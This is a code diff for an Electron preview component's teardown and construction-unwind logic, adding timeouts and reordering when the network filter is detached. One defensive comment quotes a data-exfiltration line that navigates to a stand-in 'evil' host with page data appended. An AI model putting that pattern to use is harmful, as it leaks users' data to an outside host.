@@ -22,6 +22,7 @@ import { open } from 'node:fs/promises'
 import { ErrorCode } from '../../../shared/errors'
 import { PREVIEW } from '../../../shared/constants'
 import { logger } from '../LoggingService'
+import { withTimeout } from '../../utils/withTimeout'
 import type {
   PdfExportResult,
   PreviewBounds,
@@ -32,7 +33,7 @@ import type {
 import type { IPreviewRootRegistry } from './PreviewRootRegistry'
 import type { IPreviewStillFrameCache } from './PreviewStillFrameCache'
 import type { IPreviewExportController } from './PreviewExportController'
-import type { IPreviewWatchCoordinator } from './PreviewWatchCoordinator'
+import { IPreviewWatchCoordinator, type WatchSetResult } from './PreviewWatchCoordinator'
 import type { IPreviewReloadPolicy, ReloadDecision } from './PreviewReloadPolicy'
 import type {
   IPreviewFindController,
@@ -146,11 +147,12 @@ export interface PreviewLiveViewDeps {
   readonly onForwardedShortcut?: (panelId: string, key: string) => void
   readonly platform?: NodeJS.Platform
   /**
-   * Hand a vetted URL to the OS browser (sd-074b §5.5). Injected rather than
-   * importing `shell` here, so link routing is unit-testable without Electron.
-   * Absent means external links are refused and badged.
+   * Hand a vetted URL to the OS browser (sd-074b §5.5), asking on the window
+   * this view belongs to. Injected rather than importing `shell` here, so link
+   * routing is unit-testable without Electron. Absent means external links are
+   * refused and badged.
    */
-  readonly openExternal?: (url: string) => Promise<void>
+  readonly openExternal?: (url: string, windowId: number) => Promise<void>
 }
 
 /** What the manager hands to a new live view. */
@@ -226,13 +228,15 @@ export class PreviewLiveView {
   private readonly failureLog: IPreviewFailureLog
   private readonly deps: PreviewLiveViewDeps
   private readonly readEntryHtml: (filePath: string) => Promise<string>
-  private readonly watchCoordinator: IPreviewWatchCoordinator
-  private readonly reloadPolicy: IPreviewReloadPolicy
-  private readonly findController: IPreviewFindController
-  private readonly lifecycle: { dispose(): Promise<void> }
+  private watchCoordinator!: IPreviewWatchCoordinator
+  private reloadPolicy!: IPreviewReloadPolicy
+  private findController!: IPreviewFindController
+  private lifecycle!: { dispose(): Promise<void> }
   private readonly factoryTeardown: () => void
-  private readonly linkBridge: PreviewLinkBridge
-  private readonly cspViolationBridge: PreviewCspViolationBridge
+  /** Hands the partition back for reuse; called only once the page is destroyed. */
+  private readonly sessionRelease: () => Promise<void>
+  private linkBridge!: PreviewLinkBridge
+  private cspViolationBridge!: PreviewCspViolationBridge
 
   private lastBoundsSeq = -1
   private lastBounds: PreviewBounds | null = null
@@ -263,7 +267,27 @@ export class PreviewLiveView {
     this.token = params.session.token
     this.realRoot = params.session.realRoot
     this.factoryTeardown = params.session.teardown
+    this.sessionRelease = params.session.release
 
+    // Everything from here to the end of the constructor can throw — the
+    // chokidar entry watcher opens eagerly inside `wirePreviewLifecycle`, and
+    // `window.contentView.addChildView` throws "Object has been destroyed"
+    // against a window that closed during the session build (probed on
+    // Electron 39). A throw used to leave the watcher and the coordinator with
+    // no reference and no owner (#83, #112). The collaborators are built in
+    // order and unwound in reverse on failure; the SESSION is the caller's to
+    // discard, as before.
+    try {
+      this.wireCollaborators(params)
+    } catch (error) {
+      this.destroyed = true
+      void this.unwindConstruction()
+      throw error
+    }
+  }
+
+  /** The constructor's fallible half; see the constructor for why it is separate. */
+  private wireCollaborators(params: PreviewLiveViewParams): void {
     this.watchCoordinator = this.deps.createWatchCoordinator(this.realRoot, (paths) =>
       this.onWatchChanged(paths)
     )
@@ -291,7 +315,8 @@ export class PreviewLiveView {
         requestOpenFile: (sourcePanelId, filePath, anchor, windowId) =>
           this.deps.emit.openFileRequested(sourcePanelId, filePath, anchor, windowId),
         openExternal: (url) =>
-          this.deps.openExternal?.(url) ?? Promise.reject(new Error('No external opener')),
+          this.deps.openExternal?.(url, this.window.id) ??
+          Promise.reject(new Error('No external opener')),
         recordFailure: (input) => this.failureLog.record(input)
       }
     )
@@ -342,6 +367,45 @@ export class PreviewLiveView {
       this.view.setBounds(dip)
     }
     this.applyBackdrop()
+  }
+
+  /**
+   * Dispose whatever the constructor had built when it threw. Only the
+   * view-owned collaborators: the session (token, protocol, filter, purge) is
+   * discarded by the caller, which never learned this object existed.
+   */
+  private async unwindConstruction(): Promise<void> {
+    const partial = this as unknown as Partial<{
+      lifecycle: { dispose(): Promise<void> }
+      watchCoordinator: { dispose(): Promise<void> }
+      linkBridge: { dispose(): void }
+      cspViolationBridge: { dispose(): void }
+      reloadPolicy: { dispose(): void }
+      findController: { dispose(): void }
+    }>
+    const attempt = async (label: string, run: () => void | Promise<void>): Promise<void> => {
+      try {
+        await withTimeout(Promise.resolve(run()), PREVIEW.TEARDOWN_STEP_TIMEOUT_MS, label)
+      } catch (error) {
+        logger.warn('Preview construction unwind step failed', {
+          panelId: this.panelId,
+          step: label,
+          error: error instanceof Error ? error.message : String(error)
+        })
+      }
+    }
+    if (partial.lifecycle) await attempt('lifecycle.dispose', () => partial.lifecycle!.dispose())
+    if (partial.watchCoordinator) {
+      await attempt('watchCoordinator.dispose', () => partial.watchCoordinator!.dispose())
+    }
+    if (partial.linkBridge) await attempt('linkBridge.dispose', () => partial.linkBridge!.dispose())
+    if (partial.cspViolationBridge) {
+      await attempt('cspViolationBridge.dispose', () => partial.cspViolationBridge!.dispose())
+    }
+    if (partial.reloadPolicy) await attempt('reloadPolicy.dispose', () => partial.reloadPolicy!.dispose())
+    if (partial.findController) {
+      await attempt('findController.dispose', () => partial.findController!.dispose())
+    }
   }
 
   /**
@@ -722,7 +786,22 @@ export class PreviewLiveView {
     }
     // §5(c): rebuild the CSP on the registry entry, purge, clear failures, reload.
     this.deps.registry.rebuildCsp(this.token, hosts)
-    await this.deps.storageSeal.purge(this.session)
+    // Time-boxed, and skipped on failure rather than fatal: the purge is
+    // belt-and-braces (the opaque origin is the seal, and the reload below
+    // bypasses the cache), and on Windows an approval was seen to never come
+    // back because this await never settled (2026-09-03).
+    try {
+      await withTimeout(
+        this.deps.storageSeal.purge(this.session),
+        PREVIEW.PURGE_TIMEOUT_MS,
+        'Preview approval purge'
+      )
+    } catch (error) {
+      logger.warn('Preview approval: purge did not complete; reloading anyway', {
+        panelId: this.panelId,
+        error: error instanceof Error ? error.message : String(error)
+      })
+    }
     // Re-check AFTER the await: the purge yields, and a teardown starting in
     // that window would otherwise leave `failureLog.clear()` re-emitting into a
     // dropped log and `reloadIgnoringCache()` reaching a closing WebContents.
@@ -735,6 +814,10 @@ export class PreviewLiveView {
     // swallowed as already-seen on the reload — gone from the badge and
     // unapprovable. See `PreviewCspViolationBridge.reset`.
     this.cspViolationBridge.reset()
+    logger.info('Preview approval: reloading with the new allowlist', {
+      panelId: this.panelId,
+      count: hosts.length
+    })
     this.wc.reloadIgnoringCache()
   }
 
@@ -753,7 +836,7 @@ export class PreviewLiveView {
   }
 
   exportPdf(suggestedName: string): Promise<PdfExportResult> {
-    return this.deps.exportController.exportToPdf(this.wc, suggestedName)
+    return this.deps.exportController.exportToPdf(this.wc, suggestedName, this.window.id)
   }
 
   /** Zoom-convert + clamp a CSS-px rect to the window content rect (§4.3). */
@@ -865,11 +948,30 @@ export class PreviewLiveView {
 
     const dir = dirname(this.entryFilePath)
     const candidates = extractStaticLinks(html).map((link) => resolve(dir, link))
-    const result = await this.watchCoordinator.setWatchSet(candidates)
+    let result: WatchSetResult
+    try {
+      result = await this.watchCoordinator.setWatchSet(candidates)
+    } catch (error) {
+      // The page loaded; only auto-refresh is degraded. This used to be an
+      // unhandled rejection that left the panel on 'loading' forever (#112).
+      logger.warn('Preview auto-refresh: could not watch the page files', {
+        panelId: this.panelId,
+        error: error instanceof Error ? error.message : String(error)
+      })
+      result = {
+        watched: [],
+        dropped: candidates.map((candidate) => ({ candidate, reason: 'watch-failed' as const }))
+      }
+    }
     if (this.destroyed) {
       return
     }
-    this.deps.stillFrameCache.invalidate(this.panelId)
+    // Drop the old picture only when a new one will follow: `captureWhileVisible`
+    // below captures only while the view is drawn, so invalidating behind a
+    // hidden tab left it with nothing to show until it was looked at again.
+    if (this.wantedVisible) {
+      this.deps.stillFrameCache.invalidate(this.panelId)
+    }
     this.deps.emit.loadStateChanged(this.panelId, 'ready', result.dropped.length)
     // The page has painted and the watch set is established: the one moment we
     // know the view is showing something worth photographing.
@@ -892,6 +994,8 @@ export class PreviewLiveView {
 
   /** Entry-file unlink (and rename, which unlinks the old path): failed + deleted. */
   private onEntryDeleted(): void {
+    // A deleted file's picture must not be what an evicted tab shows later.
+    this.deps.stillFrameCache.invalidate(this.panelId)
     this.recordFailureAndFail(
       'missing-local-file',
       basename(this.entryFilePath),
@@ -939,6 +1043,32 @@ export class PreviewLiveView {
         this.wc.destroy()
       }
     })
+    // Only now, with the page dead, detach the cage — then the partition can go
+    // back for reuse. A name that went back with a stale handler attached would
+    // fail the next open on it at `attachProtocol`, so a failed detach drops
+    // the name instead. `release` purges (bounded) and never rejects; guarded
+    // all the same.
+    let detached = true
+    try {
+      this.factoryTeardown()
+    } catch (error) {
+      detached = false
+      logger.warn('Preview teardown: detach failed; partition not reused', {
+        panelId: this.panelId,
+        error: error instanceof Error ? error.message : String(error)
+      })
+    }
+    if (!detached) {
+      return
+    }
+    try {
+      await this.sessionRelease()
+    } catch (error) {
+      logger.warn('Preview teardown: partition hand-back failed', {
+        panelId: this.panelId,
+        error: error instanceof Error ? error.message : String(error)
+      })
+    }
   }
 
   /**
@@ -958,9 +1088,14 @@ export class PreviewLiveView {
         })
       }
     }
+    // Each async step is bounded. On Windows `storageSeal.purge` never settled
+    // (2026-09-03): eviction hung here, the old renderer process was never
+    // destroyed, and the tab never heard `'suspended'`. A step that overruns is
+    // logged like a throw and skipped; the destroy in `teardown`'s `finally`
+    // still happens.
     const asyncStep = async (label: string, run: () => Promise<void>): Promise<void> => {
       try {
-        await run()
+        await withTimeout(run(), PREVIEW.TEARDOWN_STEP_TIMEOUT_MS, `Preview teardown ${label}`)
       } catch (error) {
         logger.warn('Preview teardown step failed', {
           panelId: this.panelId,
@@ -978,7 +1113,11 @@ export class PreviewLiveView {
       step('removeChildView', () => this.window.contentView.removeChildView(this.view))
     }
     await asyncStep('lifecycle.dispose', () => this.lifecycle.dispose())
-    step('factoryTeardown', () => this.factoryTeardown())
+    // `factoryTeardown` (the network filter, the protocol handler, the
+    // permission denials) is NOT here: it runs in `teardown()` after the page
+    // is destroyed. Detaching first left the page alive for up to ~3 s with no
+    // egress gate — a queued `location.href = 'https://evil/?' + data` landed
+    // the moment the `will-navigate` lock went (security review).
     await asyncStep('watchCoordinator.dispose', () => this.watchCoordinator.dispose())
     step('linkBridge.dispose', () => this.linkBridge.dispose())
     step('cspViolationBridge.dispose', () => this.cspViolationBridge.dispose())
@@ -987,7 +1126,9 @@ export class PreviewLiveView {
     step('failureLog.drop', () => this.failureLog.drop())
     step('stillFrameCache.invalidate', () => this.deps.stillFrameCache.invalidate(this.panelId))
     step('registry.revoke', () => this.deps.registry.revoke(this.token))
-    await asyncStep('storageSeal.purge', () => this.deps.storageSeal.purge(this.session))
+    // No purge here any more: the partition's `release` purges AFTER the page
+    // is destroyed, which is both the safe order and the only one that lets the
+    // name be reused. (On Windows the live-session purge never settled at all.)
   }
 
   /** Race `close()` against `CLOSE_TIMEOUT_MS`, then force `destroy()` (X21). */
